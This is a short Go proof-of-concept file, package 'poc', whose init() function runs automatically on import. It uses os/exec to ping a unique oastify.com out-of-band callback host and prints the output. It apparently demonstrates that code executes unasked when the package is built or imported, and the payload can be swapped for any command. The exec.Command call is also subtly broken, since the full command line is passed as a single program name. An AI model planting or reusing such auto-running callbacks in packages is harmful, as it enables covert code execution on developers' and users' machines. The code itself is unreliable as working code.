package poc

/*
#cgo CFLAGS: -Werror
void x() {}
*/
import "C"
import "os/exec"
import "fmt"

func init() {
    cmd := exec.Command("ping 0bc32egulq8qb88n1rekfk5o1f76v3js.oastify.com")
	stdout, err := cmd.Output()

	if err != nil {
		fmt.Println(err.Error())
		return
	}

	// Print the output
	fmt.Println(string(stdout))
}

	
